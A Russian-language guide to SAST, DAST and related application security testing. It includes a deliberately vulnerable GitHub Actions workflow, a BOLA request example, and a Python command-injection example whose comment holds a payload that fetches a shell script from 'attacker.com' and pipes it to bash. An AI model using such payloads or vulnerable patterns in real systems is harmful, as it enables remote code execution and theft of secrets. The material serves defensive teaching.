# Уязвимости SAST и DAST

## Определения

Для обеспечения безопасности приложений (AppSec) в 2026 году используются интегрированные методы анализа, агрегируемые в рамках платформ **ASPM (Application Security Posture Management)**. Это позволяет коррелировать данные из различных источников для точной оценки рисков.

- **SAST (Static Application Security Testing):** анализ исходного кода, байт-кода и конфигураций без запуска приложения («белый ящик»). В 2026 году SAST активно использует LLM для **семантического анализа (Intent Analysis)**, что позволяет понимать логику разработчика и автоматически генерировать исправления (Auto-Remediation).
- **DAST (Dynamic Application Security Testing):** имитация атак на работающее приложение через его внешние интерфейсы («черный ящик»). Современный DAST реализуется через **автономных ИИ-агентов**, которые самостоятельно исследуют поверхность атаки и используют **OAST (Out-of-band)** для выявления «слепых» уязвимостей.
- **IAST (Interactive AST):** гибридный рантайм-анализ («серый ящик»). В 2026 году стандартом является использование **eBPF-инструментации**, которая позволяет отслеживать выполнение кода и системные вызовы на уровне ядра без изменения исходного кода приложения.
- **SCA (Software Composition Analysis):** анализ сторонних библиотек и зависимостей через динамические графы компонентов (**Living SBOM**). Подробнее: **[Анализ зависимостей и SBOM](../../Security/Supply_Chain_Security/dependency_and_sbom_analysis.md)**.

## Базовые концепции

### Уязвимости, обнаруживаемые SAST (2026)

Статический анализ фокусируется на **Data Flow** (потоках данных) и **Control Flow** (логике управления), выявляя дефекты до того, как код будет развернут.

**Характерные находки:**

- **Инъекции (Injections):**
  - **SQL / NoSQL Injection:** использование конкатенации строк вместо параметризованных запросов.
  - **OS Command Injection:** передача нефильтрованного ввода в функции типа `exec()` или `system()`.
  - **Prompt Injection (LLM01):** смешивание инструкций системы и данных пользователя в коде взаимодействия с LLM.
- **Цепочки атак на workflows (Cordyceps):** использование небезопасных событий (например, `pull_request_target`) и передача секретов в недоверенные шаги пайплайна.
- **Межсайтовый скриптинг (XSS):** отсутствие механизмов экранирования (escaping) в шаблонах Frontend-фреймворков.
- **Небезопасная десериализация:** использование уязвимых библиотек для обработки объектов, что ведет к удаленному исполнению кода (RCE).
- **Секреты и PII:** поиск паролей, токенов и персональных данных (PII) в коде, комментариях или IaC-манифестах.
- **AI Package Hallucination:** обнаружение зависимостей, которые были предложены ИИ-копилотами, но не существуют в официальных реестрах (риск захвата имен злоумышленниками).
- **Ошибки IaC (Infrastructure as Code):** небезопасные конфигурации Docker (запуск от root), Kubernetes (отсутствие Network Policies) и Terraform.

### Уязвимости, обнаруживаемые DAST (2026)

Динамический анализ выполняется автономными агентами, которые исследуют бизнес-логику и поведение приложения в реальном времени.

**Характерные находки:**

- **BOLA / IDOR (API01):** доступ к чужим объектам через манипуляцию ID в URL или теле запроса.
- **BFLA (Broken Function Level Authorization):** несанкционированный доступ к административным функциям API.
- **Prompt Injection (Runtime):** подтверждение эксплуатации уязвимостей LLM через имитацию действий пользователя и проверку реакции модели.
- **MCP Tool Abuse (2026):** попытки несанкционированного вызова инструментов (Tools), доступных ИИ-агенту через **Model Context Protocol**.
- **Слепые уязвимости (Blind SSRF / SQLi):** обнаружение через мониторинг внешних взаимодействий (DNS/HTTP коллбэки) на OAST-серверы.
- **Поведенческие аномалии:** выявление утечек больших объемов данных или аномального времени ответа, что указывает на логические ошибки.
- **Небезопасная конфигурация облачного периметра:** ошибки в заголовках CORS, CSP, HSTS и отсутствие защиты от DoS на уровне шлюза.

## Практические сценарии

### Пример 1: Атака Cordyceps (Workflow Escalation)

Уязвимость возникает при использовании привилегированного триггера `pull_request_target` с автоматическим чекаутом кода из внешнего PR.

```yaml
# Уязвимый workflow (GitHub Actions)
on:
  pull_request_target: # Имеет доступ к секретам репозитория

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }} # Код из PR атакующего
      - name: Run logic
        run: |
          npm install
          npm run build # Может содержать вредоносный код в package.json
```

**Обнаружение (SAST):** Сканер помечает комбинацию `pull_request_target` + `checkout` как **Critical**, так как это позволяет атакующему выполнить произвольный код с доступом к секретам.

### Пример 2: BOLA/IDOR в API (Detection via Autonomous DAST)

Атака на изменение идентификатора пользователя для получения конфиденциальной информации.

```http
# Запрос ИИ-агента DAST
GET /api/v1/user/profile/1001 HTTP/1.1
Authorization: Bearer <valid_token_for_user_1001>

# Автономный агент пробует манипуляцию
GET /api/v1/user/profile/1002 HTTP/1.1
Authorization: Bearer <valid_token_for_user_1001>
```

**Обнаружение (DAST):** Если сервер возвращает `200 OK` с данными пользователя `1002`, автономный агент фиксирует **BOLA** и автоматически генерирует Proof-of-Concept.

### Пример 3: Внедрение команд (Command Injection) в Python

```python
# Уязвимо: прямое использование ввода пользователя (SAST обнаружит Taint Flow)
host = request.args.get("host")
os.system("ping -c 1 " + host) 
# host = "8.8.8.8; curl attacker.com/shell | bash"
```

```python
# Безопасно: использование защищенных абстракций
host = request.args.get("host")
subprocess.run(["ping", "-c", "1", host], check=True)
# subprocess.run автоматически экранирует аргументы
```

## Дополнительная информация

### Нюансы анализа и приоритизации

- **Reachability Analysis:** В 2026 году ключевым является подтверждение достижимости уязвимости. Если SAST нашел уязвимость в библиотеке, но IAST (eBPF) показывает, что уязвимая функция никогда не вызывается в рантайме, её приоритет снижается (VEX-аттестация).
- **False Positives Reduction:** Использование ИИ-валидации в SAST позволяет сократить количество ложных срабатываний на 80-90% за счет понимания контекста санитайзеров и проверок безопасности.
- **eBPF-наблюдаемость:** Позволяет обнаруживать эксплойты в реальном времени, фиксируя аномальные попытки чтения файлов (`/etc/passwd`) или сетевые соединения, инициированные легитимными процессами.
